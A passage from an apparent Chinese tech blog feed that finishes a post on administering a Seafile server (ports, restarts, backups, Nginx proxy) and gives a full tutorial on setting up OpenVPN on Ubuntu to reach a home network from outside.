<h3 id="在另一端口上运行-Seahub"><a href="#在另一端口上运行-Seahub" class="headerlink" title="在另一端口上运行 Seahub"></a>在另一端口上运行 Seahub</h3><p>如果你不想在默认的 8000 端口上运行 Seahub, 而是想自定义端口（比如8001）中运行，请按以下步骤操作:</p>
<ul>
<li>  关闭 Seafile 服务器</li>
</ul>
<!-- -->

<pre><code>./seahub.sh stop # 停止 Seafile 进程
./seafile.sh stop # 停止 Seahub
</code></pre>
<ul>
<li>  更改<code>haiwen/conf/ccnet.conf</code>文件中<code>SERVICE_URL</code> 的值(假设你的 ip 或者域名是<code>192.168.0.190</code>), 如下 (从 5.0 版本开始，可以直接在管理员界面中设置。注意，如果同时在 Web 界面和配置文件中设置了这个值，以 Web 界面的配置为准。):</li>
</ul>
<!-- -->

<pre><code>SERVICE_URL = http://192.168.0.190:8001
</code></pre>
<ul>
<li>  重启 Seafile 服务器</li>
</ul>
<!-- -->

<pre><code>./seafile.sh start # 启动 Seafile 服务
./seahub.sh start 8001 # 启动 Seahub 网站 （运行在8001端口上）
</code></pre>
<h2 id="关闭-重启-Seafile-和-Seahub"><a href="#关闭-重启-Seafile-和-Seahub" class="headerlink" title="关闭/重启 Seafile 和 Seahub"></a>关闭/重启 Seafile 和 Seahub</h2><h3 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h3><pre><code>./seahub.sh stop # 停止 Seahub
./seafile.sh stop # 停止 Seafile 进程
</code></pre>
<h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><pre><code>./seafile.sh restart # 停止当前的 Seafile 进程，然后重启 Seafile
./seahub.sh restart  # 停止当前的 Seahub 进程，并在 8000 端口重新启动 Seahub
</code></pre>
<h3 id="如果停止-重启的脚本运行失败"><a href="#如果停止-重启的脚本运行失败" class="headerlink" title="如果停止/重启的脚本运行失败"></a>如果停止/重启的脚本运行失败</h3><p>大多数情况下 seafile.sh seahub.sh 脚本可以正常工作。如果遇到问题：</p>
<ul>
<li>  使用<strong>pgrep</strong>命令检查 seafile/seahub 进程是否还在运行中</li>
</ul>
<!-- -->

<pre><code>pgrep -f seafile-controller # 查看 Seafile 进程
pgrep -f &quot;seahub&quot; # 查看 Seahub 进程
</code></pre>
<ul>
<li>  使用<strong>pkill</strong>命令杀掉相关进程</li>
</ul>
<!-- -->

<pre><code>pkill -f seafile-controller # 结束 Seafile 进程
pkill -f &quot;seahub&quot; # 结束 Seafile 进程
</code></pre>
<h2 id="Seafile-其他相关信息"><a href="#Seafile-其他相关信息" class="headerlink" title="Seafile 其他相关信息"></a>Seafile 其他相关信息</h2><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><p>使用 crontab 的 @reboot 设置开机自启，<code>crontab -e</code> 进去编辑页面添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@reboot /home/username/seafile/seafile-server-latest/seafile.sh start &amp;&amp; /home/username/seafile/seafile-server-latest/seahub.sh start 8001</span><br></pre></td></tr></table></figure>
<h3 id="每天自动备份数据库"><a href="#每天自动备份数据库" class="headerlink" title="每天自动备份数据库"></a>每天自动备份数据库</h3><p>备份脚本位于 <code>/home/username/seafile/backup</code> 文件夹中，内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">user=&#123;数据库用户名&#125;</span><br><span class="line">pass=&#123;密码&#125;</span><br><span class="line">datetime=`date +&quot;%Y-%m-%d-%H-%M-%S&quot;`</span><br><span class="line"></span><br><span class="line">mysqldump -u $user -p$pass --opt ccnet-db &gt; /home/username/seafile/backup/databases/ccnet/ccnet-db.sql.$datetime</span><br><span class="line">mysqldump -u $user -p$pass --opt seafile-db &gt; /home/username/seafile/backup/databases/seafile/seafile-db.sql.$datetime</span><br><span class="line">mysqldump -u $user -p$pass --opt seahub-db &gt; /home/username/seafile/backup/databases/seahub/seahub-db.sql.$datetime</span><br></pre></td></tr></table></figure>
<p>在 crontab 设置定时任务每天自动备份数据库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 1 * * * bash /home/username/seafile/backup/databases/seafile_backup.sh 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<h3 id="恢复备份数据库"><a href="#恢复备份数据库" class="headerlink" title="恢复备份数据库"></a>恢复备份数据库</h3><p>在 <code>/home/username/seafile/backup/databases</code> 文件夹下有三个文件夹 <code>ccnet</code>、<code>seafile</code>、<code>seahub</code>分别储存不同库的备份数据，需要依次恢复三个数据库数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u[username] -p[password] ccnet-db &lt; ccnet-db.sql.2013-10-19-16-00-05</span><br><span class="line">mysql -u[username] -p[password] seafile-db &lt; seafile-db.sql.2013-10-19-16-00-20</span><br><span class="line">mysql -u[username] -p[password] seahub-db &lt; seahub-db.sql.2013-10-19-16-01-05</span><br></pre></td></tr></table></figure>

<h3 id="Nginx-反向代理外网访问"><a href="#Nginx-反向代理外网访问" class="headerlink" title="Nginx 反向代理外网访问"></a>Nginx 反向代理外网访问</h3><p>首先需要有一台有公网 IP 的服务器，然后用 OpenVPN 搭建 VPN 网络，为内网机器分配 IP：<code>10.8.0.190</code>。详细方法参考：<a href="http://woodenrobot.me/2018/08/11/Ubuntu-%E6%9E%B6%E8%AE%BE-OpenVPN-%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">Ubuntu 架设 OpenVPN 实现内网穿透</a></p>
<ol>
<li><p>在 Seafile 所在机器添加以下 Nginx 配置进行反向代理，使得内网访问 192.168.0.190 即可访问 Seafile 主页：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name 192.168.0.190 10.8.0.190 seafile.xxx.xxx;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_pass http://192.168.0.190:8001;</span><br><span class="line">        proxy_redirect default;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>在有公网 IP 机器上添加以下 Nginx 配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name seafile.xxxx.xxx;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_pass http://10.8.0.190;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 8082;</span><br><span class="line">    server_name seafile.xxx.xxx;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_pass http://10.8.0.190:8082;</span><br><span class="line">        proxy_redirect default;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="域名内网访问走内网"><a href="#域名内网访问走内网" class="headerlink" title="域名内网访问走内网"></a>域名内网访问走内网</h3></li>
<li><p>首先需要使用 Padavan 老毛子路由器系统；</p>
</li>
<li><p>进入路由器后台打开 <code>内部网络 (LAN) - DHCP 服务器</code>;<br><img src="/images/newifi_config.png" alt="Alt text"></p>
</li>
<li><p>添加路由器 hosts 规则并设置路由器 DNS 地址，并点击应用本页面设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.190  seafile.xxx.xxx</span><br></pre></td></tr></table></figure>
<p><img src="/images/newifi_host.png" alt="Alt text"><br><img src="/images/dns_config.png" alt="Alt text"></p>
</li>
<li><p>进入 <code>广告屏蔽功能 - Adbyby</code>，启用 Adbyby 功能并开启重定向 DNS，重定向地址设为 <code>192.168.0.1</code>:<br><img src="/images/dns_address.png" alt="Alt text"></p>
<h3 id="修复更换头像-Bug"><a href="#修复更换头像-Bug" class="headerlink" title="修复更换头像 Bug"></a>修复更换头像 Bug</h3><p>更换头像接口报错，无法打开主页。修复方法：<br>首先安装 libjpeg8-dev，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt install libjpeg8-dev</span><br></pre></td></tr></table></figure>
<p>然后更新 python Pillow 库为最新版</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install Pillow</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Seafile</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 架设 OpenVPN 实现内网穿透</title>
    <url>/2018/08/11/Ubuntu-%E6%9E%B6%E8%AE%BE-OpenVPN-%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>家里的网络因为没有公网 IP，有时候想要连接到家里的树莓派或者电脑就无法实现。这个时候可以采用内网穿透的方法远程连接家中的机器，内网穿透的方案有很多，下面介绍一种采用 OpenVPN 实现内网穿透的方案。</p>
<hr>
<span id="more"></span>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>主机：腾讯云<br>操作系统：Ubuntu 16.04</p>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="安装-OpenVPN"><a href="#安装-OpenVPN" class="headerlink" title="安装 OpenVPN"></a>安装 OpenVPN</h2><p>首先，我们需要在服务器安装 OPenVPN。在 Ubuntu 系统中我们可以通过 <code>apt</code> 简单的进行安装。同时我们也需要安装 <code>easy-rsa</code>，它可以帮助我们生成 VPN 使用过程中所需的 CA 证书。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure>
<h2 id="设置-CA-目录"><a href="#设置-CA-目录" class="headerlink" title="设置 CA 目录"></a>设置 CA 目录</h2><p>OpenVPN 是使用 TLS/SSL 的 VPN。这意味着它利用证书来加密服务器和客户端之间的通信。为了发布受信任的证书，我们需要建立一个自己的简单的证书颁发机构(CA)。<br>使用 <code>make-cadir</code> 命令复制 easy-rsa 模板到 home 目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make-cadir ~/openvpn/openvpn-ca</span><br></pre></td></tr></table></figure>
<p>接着进入刚刚新建的目录准备配置 CA:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/openvpn/openvpn-ca</span><br></pre></td></tr></table></figure>
<h2 id="配置-CA-变量"><a href="#配置-CA-变量" class="headerlink" title="配置 CA 变量"></a>配置 CA 变量</h2><p>进入 <code>~/openvpn/openvpn-ca</code> 目录后，我们需要修改 <code>vars</code> 文件，以便于生成需要的 CA 值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ vim vars</span><br></pre></td></tr></table></figure>
<p>在文件底部找到以下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将这些变量修改为任意你喜欢的值，但是不要为空：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">export KEY_COUNTRY=&quot;CN&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;SC&quot;</span><br><span class="line">export KEY_CITY=&quot;Chengdu&quot;</span><br><span class="line">export KEY_ORG=&quot;woodenrobot&quot;</span><br><span class="line">export KEY_EMAIL=&quot;woodenrobot1993@gmail.com&quot;</span><br><span class="line">export KEY_OU=&quot;Community&quot;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>然后，我们还要修改紧接着出现的 <code>KEY_NAME</code> 的值，为了简单起见，我们改为 <code>server</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KEY_NAME=&quot;server&quot;</span><br></pre></td></tr></table></figure>
<h2 id="构建-CA-证书"><a href="#构建-CA-证书" class="headerlink" title="构建 CA 证书"></a>构建 CA 证书</h2><p>首先进入你的 CA 目录，然后执行 <code>source vars</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/openvpn/openvpn-ca</span><br><span class="line">$ source vars</span><br></pre></td></tr></table></figure>
<p>接着会有以下输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ NOTE: If you run ./clean-all, I will be doing a rm -rf on /home/ubuntu/openvpn/openvpn-ca/keys</span><br></pre></td></tr></table></figure>
<p>执行下列操作确保操作环境干净：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./clean-all</span><br></pre></td></tr></table></figure>
<p>现在我们可以构建根 CA：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./build-ca</span><br></pre></td></tr></table></figure>
<p>这将会启动创建根证书颁发密钥、证书的过程。由于我们刚才修改了 vars 文件，所有值应该都会自动填充。所以，一路回车就好了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Generating a 2048 bit RSA private key</span><br><span class="line">..........................................................................................+++</span><br><span class="line">...............................+++</span><br><span class="line">writing new private key to &#x27;ca.key&#x27;</span><br><span class="line">-----</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [CN]:</span><br><span class="line">State or Province Name (full name) [BJ]:</span><br><span class="line">Locality Name (eg, city) [Beijing]:</span><br><span class="line">Organization Name (eg, company) [woodenrobot]:</span><br><span class="line">Organizational Unit Name (eg, section) [Community]:</span><br><span class="line">Common Name (eg, your name or your server&#x27;s hostname) [woodenrobot]:</span><br><span class="line">Name [server]:</span><br><span class="line">Email Address [woodenrobot@163.com]:</span><br></pre></td></tr></table></figure>
<p>现在，我们就有了创建以下步骤需要的 CA 证书。</p>
<h2 id="创建服务器端证书、密钥和加密文件"><a href="#创建服务器端证书、密钥和加密文件" class="headerlink" title="创建服务器端证书、密钥和加密文件"></a>创建服务器端证书、密钥和加密文件</h2><p>通过下列命令生成服务器端证书和秘钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./build-key-server server</span><br></pre></td></tr></table></figure>
<p>注：<code>server</code> 就是刚才在 <code>vars</code> 文件中修改的 <code>KEY_NAME</code> 变量的值。请不要使用别的名字！<br>然后一直回车选择默认值即可，不要设置 <code>challenge password</code>，直接回车即可。到最后，你需要输入两次 y 注册证书和提交。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Certificate is to be certified until May  1 17:51:16 2026 GMT (3650 days)</span><br><span class="line">Sign the certificate? [y/n]:y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1 out of 1 certificate requests certified, commit? [y/n]y</span><br><span class="line">Write out database with 1 new entries</span><br><span class="line">Data Base Updated</span><br></pre></td></tr></table></figure>
<p>然后还需要生成一些其他东西。我们可以在密钥交换过程中生成一个强大的 Diffie-Hellman 密钥:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./build-dh</span><br></pre></td></tr></table></figure>
<p>这个操作大约会花费几分钟不等。<br>然后，我们可以生成 HMAC 签名加强服务器的 TLS 完整性验证功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure>
<h2 id="配置-OpenVPN-服务"><a href="#配置-OpenVPN-服务" class="headerlink" title="配置 OpenVPN 服务"></a>配置 OpenVPN 服务</h2><p>首先将刚刚生成的各类文件复制到 OpenVPN 目录下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/openvpn-ca/keys</span><br><span class="line">$ sudo cp ca.crt ca.key server.crt server.key ta.key dh2048.pem /etc/openvpn</span><br></pre></td></tr></table></figure>
<p>然后，解压并复制一个 OpenVPN 配置文件到 OpenVPN 目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gunzip -c /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz | sudo tee /etc/openvpn/server.conf</span><br></pre></td></tr></table></figure>
<p>接着更改配置，注释掉 <code>udp</code> 更改协议为 <code>tcp</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proto tcp</span><br><span class="line">;proto udp</span><br></pre></td></tr></table></figure>
<p>找到 <code>tls-auth</code> 位置，去掉注释，并在下面新增一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tls-auth ta.key 0 # This file is secret</span><br><span class="line">key-direction 0</span><br></pre></td></tr></table></figure>
<p>去掉 <code>user</code> 和 <code>group</code> 行前的注释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user nobody</span><br><span class="line">group nogroup</span><br></pre></td></tr></table></figure>
<p>去掉 <code>client-to-client</code> 行前的注释允许客户端之间互相访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client-to-client</span><br></pre></td></tr></table></figure>
<p>开启客户端固定 IP 配置文件夹：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client-config-dir ccd</span><br></pre></td></tr></table></figure>
<p>去掉注释后的完整配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">port 1194</span><br><span class="line"></span><br><span class="line">proto udp</span><br><span class="line"></span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key</span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br><span class="line"></span><br><span class="line">server 10.8.0.0 255.255.255.0</span><br><span class="line"></span><br><span class="line">ifconfig-pool-persist ipp.txt</span><br><span class="line"></span><br><span class="line">client-config-dir ccd</span><br><span class="line"></span><br><span class="line">client-to-client</span><br><span class="line"></span><br><span class="line">keepalive 10 120</span><br><span class="line"></span><br><span class="line">tls-auth ta.key 0</span><br><span class="line">key-direction 0</span><br><span class="line"></span><br><span class="line">comp-lzo</span><br><span class="line"></span><br><span class="line">user nobody</span><br><span class="line">group nogroup</span><br><span class="line"></span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line">status openvpn-status.log</span><br><span class="line"></span><br><span class="line">verb 3</span><br></pre></td></tr></table></figure>
<h2 id="调整服务器网络配置"><a href="#调整服务器网络配置" class="headerlink" title="调整服务器网络配置"></a>调整服务器网络配置</h2><h3 id="允许-IP-转发"><a href="#允许-IP-转发" class="headerlink" title="允许 IP 转发"></a>允许 IP 转发</h3><p>编辑 <code>sudo vim /etc/sysctl.conf</code> 文件，去掉 <code>net.ipv4.ip_forward</code> 设置前的注释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
<p>输入 <code>sudo sysctl -p</code> 读取文件并对当前会话生效。</p>
<h3 id="调整-UFW-规则"><a href="#调整-UFW-规则" class="headerlink" title="调整 UFW 规则"></a>调整 UFW 规则</h3><p><code>sudo vim /etc/ufw/before.rules</code>  编辑文件，在文件顶部，新增如下 11-18 行的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01 #</span><br><span class="line">02 # rules.before</span><br><span class="line">03 #</span><br><span class="line">04 # Rules that should be run before the ufw command line added rules. Custom</span><br><span class="line">05 # rules should be added to one of these chains:</span><br><span class="line">06 #   ufw-before-input</span><br><span class="line">07 #   ufw-before-output</span><br><span class="line">08 #   ufw-before-forward</span><br><span class="line">09 #</span><br><span class="line">10 </span><br><span class="line">11 # START OPENVPN RULES</span><br><span class="line">12 # NAT table rules</span><br><span class="line">13 *nat</span><br><span class="line">14 :POSTROUTING ACCEPT [0:0] </span><br><span class="line">15 # Allow traffic from OpenVPN client to eth0</span><br><span class="line">16 -A POSTROUTING -s 10.8.0.0/8 -o eth0 -j MASQUERADE</span><br><span class="line">17 COMMIT</span><br><span class="line">18 # END OPENVPN RULES</span><br><span class="line">19</span><br><span class="line">20 # Don&#x27;t delete these required lines, otherwise there will be errors</span><br><span class="line">*filter</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure>
<p>其中，第 16 行还需要做一点调整。在终端执行 ip route | grep default 命令，你会看到类似如下的输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default via xxx.xxx.xxx.xxx dev eth0</span><br></pre></td></tr></table></figure>
<p>dev 后的内容如果与第 16 行的 <code>eth0</code> 不同则更换 <code>eth0</code> 为 dev 后的内容，保存文件退出。</p>
<p>接着 <code>sudo vim /etc/default/ufw</code>  修改文件，找到  <code>DEFAULT_FORWARD_POLICY</code>  设置，修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure>
<h3 id="打开-OpenVPN-端口并使变化生效"><a href="#打开-OpenVPN-端口并使变化生效" class="headerlink" title="打开 OpenVPN 端口并使变化生效"></a>打开 OpenVPN 端口并使变化生效</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo ufw allow 1194/tcp</span><br><span class="line">$ sudo ufw disable</span><br><span class="line">$ sudo ufw enable</span><br></pre></td></tr></table></figure>
<h2 id="启动-OpenVPN"><a href="#启动-OpenVPN" class="headerlink" title="启动 OpenVPN"></a>启动 OpenVPN</h2><p>执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl start openvpn@server</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>设置开机自启：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure>
<h2 id="创建客户端配置"><a href="#创建客户端配置" class="headerlink" title="创建客户端配置"></a>创建客户端配置</h2><h3 id="生成客户端证书、密钥对"><a href="#生成客户端证书、密钥对" class="headerlink" title="生成客户端证书、密钥对"></a>生成客户端证书、密钥对</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/openvpn-ca</span><br><span class="line">$ source vars</span><br><span class="line">$ ./build-key client-woodenrobot</span><br></pre></td></tr></table></figure>
<p><code>client-woodenrobot</code> 为密钥对名称，生成过程中回车选择默认选项即可。</p>
<h3 id="创建客户端配置-1"><a href="#创建客户端配置-1" class="headerlink" title="创建客户端配置"></a>创建客户端配置</h3><p>执行下列命令，生成客户端配置的基础文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mkdir -p ~/client-configs/files</span><br><span class="line">$ chmod 700 ~/client-configs/files</span><br><span class="line">$ cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf ~/client-configs/base.conf</span><br></pre></td></tr></table></figure>
<p>然后打开 ~/client-configs/base.conf 文件，修改 <code>remote server_IP_address 1194</code> 一行为你的服务器公网 IP。<br>然后更改客户端协议为 <code>tcp</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;dev tap</span><br><span class="line">dev tun</span><br></pre></td></tr></table></figure>
<p>去掉 <code>user</code> 和 <code>group</code> 前的注释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Downgrade privileges after initialization (non-Windows only)</span><br><span class="line">user nobody</span><br><span class="line">group nogroup</span><br></pre></td></tr></table></figure>
<p>找到 ca/cert/key，注释掉：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SSL/TLS parms.</span><br><span class="line"># See the server config file for more</span><br><span class="line"># description.  It&#x27;s best to use</span><br><span class="line"># a separate .crt/.key file pair</span><br><span class="line"># for each client.  A single ca</span><br><span class="line"># file can be used for all clients.</span><br><span class="line">#ca ca.crt</span><br><span class="line">#cert client.crt</span><br><span class="line">#key client.key</span><br></pre></td></tr></table></figure>
<p>最后在文件末新增一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure>
<p>保存退出文件。<br>去掉注释后的完整配置为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client</span><br><span class="line"></span><br><span class="line">dev tun</span><br><span class="line"></span><br><span class="line">proto tcp</span><br><span class="line"></span><br><span class="line">remote server_IP_address 1194</span><br><span class="line"></span><br><span class="line">resolv-retry infinite</span><br><span class="line"></span><br><span class="line">nobind</span><br><span class="line"></span><br><span class="line">user nobody</span><br><span class="line">group nogroup</span><br><span class="line"></span><br><span class="line">persist-key</span><br><span class="line">persist-tun</span><br><span class="line"></span><br><span class="line">remote-cert-tls server</span><br><span class="line"></span><br><span class="line">comp-lzo</span><br><span class="line"></span><br><span class="line">verb 3</span><br><span class="line"></span><br><span class="line">key-direction 1</span><br></pre></td></tr></table></figure>
<h2 id="创建配置生成脚本"><a href="#创建配置生成脚本" class="headerlink" title="创建配置生成脚本"></a>创建配置生成脚本</h2><p>新建 ~/client-configs/make_config.sh 文件，复制如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># First argument: Client identifier</span><br><span class="line">KEY_DIR=~/openvpn-ca/keys</span><br><span class="line">OUTPUT_DIR=~/client-configs/files</span><br><span class="line">BASE_CONFIG=~/client-configs/base.conf</span><br><span class="line">cat $&#123;BASE_CONFIG&#125; \</span><br><span class="line">    &lt;(echo -e &#x27;&lt;ca&gt;&#x27;) \</span><br><span class="line">    $&#123;KEY_DIR&#125;/ca.crt \</span><br><span class="line">    &lt;(echo -e &#x27;&lt;/ca&gt;\n&lt;cert&gt;&#x27;) \</span><br><span class="line">    $&#123;KEY_DIR&#125;/$&#123;1&#125;.crt \</span><br><span class="line">    &lt;(echo -e &#x27;&lt;/cert&gt;\n&lt;key&gt;&#x27;) \</span><br><span class="line">    $&#123;KEY_DIR&#125;/$&#123;1&#125;.key \</span><br><span class="line">    &lt;(echo -e &#x27;&lt;/key&gt;\n&lt;tls-auth&gt;&#x27;) \</span><br><span class="line">    $&#123;KEY_DIR&#125;/ta.key \</span><br><span class="line">    &lt;(echo -e &#x27;&lt;/tls-auth&gt;&#x27;) \</span><br><span class="line">    &gt; $&#123;OUTPUT_DIR&#125;/$&#123;1&#125;.ovpn</span><br></pre></td></tr></table></figure>
<p>保存并赋予执行权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ chmod 700 ~/client-configs/make_config.sh</span><br></pre></td></tr></table></figure>
<h2 id="生成客户端配置"><a href="#生成客户端配置" class="headerlink" title="生成客户端配置"></a>生成客户端配置</h2><p>执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/client-configs</span><br><span class="line">$ ./make_config.sh client-woodenrobot</span><br></pre></td></tr></table></figure>
<p>使用此脚本生成一个配置文件方便客户端使用。<br><strong>注：需要生成客户端密钥后才可使用脚本生成配置文件，<code>client-woodenrobot.ovpn</code> 为刚刚生成的客户端密钥名称</strong><br>生成后的脚本储存在  <code>~/client-configs/files</code> 目录下，名称为 <code>client-woodenrobot</code>。将文件下载到本地即可使用了。</p>
<h2 id="为客户端设置固定-IP"><a href="#为客户端设置固定-IP" class="headerlink" title="为客户端设置固定 IP"></a>为客户端设置固定 IP</h2><p>首先在 OpenVPN 所在的文件夹内创建 <code>ccd</code> 文件夹：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo mkdir -p /etc/openvpn/ccd</span><br></pre></td></tr></table></figure>
<p>然后进入该文件夹并创建与客户端密钥名称相同的文件夹并写入一下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd /etc/openvpn/ccd</span><br><span class="line">$ vim client-woodenrobot</span><br></pre></td></tr></table></figure>
<p>内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig-push 10.8.0.8 10.8.0.9</span><br></pre></td></tr></table></figure>
<p>此内容意为固定 <code>client-woodenrobot</code> 客户端的 OpenVPN 内网 IP 为 <code>10.8.0.8</code>。</p>
